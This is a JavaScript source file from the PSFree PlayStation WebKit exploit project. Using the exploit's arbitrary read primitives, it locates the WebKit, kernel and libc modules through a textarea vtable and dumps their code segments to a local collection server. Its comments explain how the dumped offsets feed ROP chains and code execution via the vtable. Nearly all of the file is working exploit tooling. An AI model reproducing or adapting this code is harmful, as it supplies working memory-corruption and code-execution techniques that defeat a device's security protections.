/* Copyright (C) 2024 anonymous

This file is part of PSFree.

PSFree is free software: you can redistribute it and/or modify
it under the terms of the GNU Affero General Public License as
published by the Free Software Foundation, either version 3 of the
License, or (at your option) any later version.

PSFree is distributed in the hope that it will be useful,
but WITHOUT ANY WARRANTY; without even the implied warranty of
MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
GNU Affero General Public License for more details.

You should have received a copy of the GNU Affero General Public License
along with this program.  If not, see <https://www.gnu.org/licenses/>.  */

import * as config from './config.mjs';

import { Int } from './module/int64.mjs';
import { Addr, mem } from './module/mem.mjs';
import { make_buffer, find_base, resolve_import } from './module/memtools.mjs';
import { KB, MB } from './module/constants.mjs';

import {
    debug_log,
    align,
    die,
    send,
} from './module/utils.mjs';

import * as rw from './module/rw.mjs';
import * as o from './module/offset.mjs';

const origin = window.origin;
const port = '8000';
const url = `${origin}:${port}`;

const textarea = document.createElement('textarea');
// JSObject
const js_textarea = mem.addrof(textarea);

// boundaries of the .text + PT_SCE_RELRO portion of a module
function get_boundaries(leak) {
    const lib_base = find_base(leak, true, true);
    const lib_end = find_base(leak, false, false);

    return [lib_base, lib_end]
}

// dump a module's .text and PT_SCE_RELRO segments only
function dump(name, lib_base, lib_end) {
    // assumed size < 4GB
    const lib_size = lib_end.sub(lib_base).low();
    debug_log(`${name} base: ${lib_base}`);
    debug_log(`${name} size: ${lib_size}`);
    const lib = make_buffer(
        lib_base,
        lib_size
    );
    send(
        url,
        lib,
        `${name}.sprx.text_${lib_base}.bin`,
        () => debug_log(`${name} sent`)
    );
}

// dump for libSceNKWebKit.sprx
function dump_libwebkit() {
    let addr = js_textarea;
    // WebCore::HTMLTextAreaElement
    addr = addr.readp(0x18);

    // vtable for WebCore::HTMLTextAreaElement
    // in PT_SCE_RELRO segment (p_type = 0x6100_0010)
    addr = addr.readp(0);

    debug_log(`vtable: ${addr}`);
    const vtable = make_buffer(addr, 0x400);
    send(url, vtable, `vtable_${addr}.bin`, () => debug_log('vtable sent'));

    const [lib_base, lib_end] = get_boundaries(addr);
    dump('libSceNKWebKit', lib_base, lib_end);

    return lib_base;
}

// dump for libkernel_web.sprx
function dump_libkernel(libwebkit_base) {
    const offset = 0x8d8;
    const vtable_p = js_textarea.readp(0x18).readp(0);
    // __stack_chk_fail
    const stack_chk_fail_import = libwebkit_base.add(offset);

    const libkernel_leak = resolve_import(stack_chk_fail_import);
    debug_log(`__stack_chk_fail import: ${libkernel_leak}`);

    const [lib_base, lib_end] = get_boundaries(libkernel_leak);
    dump('libkernel_web', lib_base, lib_end);
}

// dump for libSceLibcInternal.sprx
function dump_libc(libwebkit_base) {
    const offset = 0x918;
    const vtable_p = js_textarea.readp(0x18).readp(0);
    // strlen
    const strlen_import = libwebkit_base.add(offset);

    const libc_leak = resolve_import(strlen_import);
    debug_log(`strlen import: ${libc_leak}`);

    const [lib_base, lib_end] = get_boundaries(libc_leak);
    dump('libSceLibcInternal', lib_base, lib_end);
}

function dump_webkit() {
    const libwebkit_base = dump_libwebkit();
    dump_libkernel(libwebkit_base);
    dump_libc(libwebkit_base);
}

// See globalFuncEval() from
// WebKit/Source/JavaScriptCore/runtime/JSGlobalObjectFunctions.cpp at PS4
// 8.03.
//
// Used to dump the implementation of eval() to figure out the expression
// "execState.argument(0)".
//
// eval()'s native function receives a JSC::ExecState pointer (renamed to
// JSC::CallFrame on webkitgtk 2.34.4). That type has an argument() method
// which takes an index and returns the corresponding JSValue passed to eval(),
// e.g. execState.argument(0) is the first JSValue argument.
//
// execState.argument(0) evaluates to *(&execState + argumentOffset + 0).
// Knowing the argumentOffset is useful for passing data to ROP chains.
// argumentOffset is 0x30 for PS4 8.03.
//
// The PS4 uses the System V ABI. The ExecState pointer is passed to the rdi
// register since it is the first argument. ROP chains can get the JSValue
// passed via *(rdi + 0x30).
//
// For example, the expression "eval(1)" has the JSValue encoding of 1 passed
// to *(rdi + 0x30).
function dump_eval() {
    let addr = js_textarea;
    // WebCore::HTMLTextAreaElement
    addr = addr.readp(0x18);

    // vtable for WebCore::HTMLTextAreaElement
    // in PT_SCE_RELRO segment (p_type = 0x6100_0010)
    addr = addr.readp(0);

    const libwebkit_base =  find_base(addr, true, true);
    const impl = mem.addrof(eval).readp(0x18).readp(0x38);
    const offset = impl.sub(libwebkit_base);
    send(
        url,
        make_buffer(impl, 0x800),
        `eval_dump_offset_${offset}.bin`,
        () => debug_log('sent')
    );
}

// Initially we just used the vtable offset from pOOBs4 (0x1c8) and tested if
// it works. It did but let's add this dumper so we can verify it another way.
// See howto_code_exec.txt about code execution via the vtable of a textarea
// element.
function dump_scrollLeft() {
    let proto = Object.getPrototypeOf(textarea);
    proto = Object.getPrototypeOf(proto);
    proto = Object.getPrototypeOf(proto);

    const scrollLeft_get =
        Object.getOwnPropertyDescriptors(proto).scrollLeft.get
    ;

    // get the JSCustomGetterSetterFunction
    const js_func = mem.addrof(scrollLeft_get);
    const getterSetter = js_func.readp(0x28);
    const getter = getterSetter.readp(8);

    const libwebkit_base = find_base(getter, true, true);
    const offset = getter.sub(libwebkit_base);
    send(
        url,
        make_buffer(getter, 0x800),
        `scrollLeft_getter_dump_offset_${offset}.bin`,
        () => debug_log('sent')
    );
}

dump_scrollLeft();
